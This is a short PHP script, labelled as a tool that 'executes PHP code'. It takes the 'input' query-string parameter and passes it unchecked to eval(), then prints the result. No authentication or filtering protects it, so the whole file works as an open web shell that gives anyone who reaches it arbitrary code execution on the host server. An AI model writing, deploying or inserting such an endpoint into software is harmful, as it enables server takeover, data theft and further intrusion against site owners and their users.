<?php
$manual = 'Executes PHP code.' . PHP_EOL . 'Example usage: php echo "hello world"';
$version = '1.0';

$input = isset($_GET['input']) ? $_GET['input'] : '';

if (!empty($_GET['input'])) {
    ob_start();
    eval($input);
    $output = ob_get_contents();
    ob_end_clean();

    echo "<pre>$output</pre>";
}else{
    echo 'Error: could not execute PHP code.';
}
?>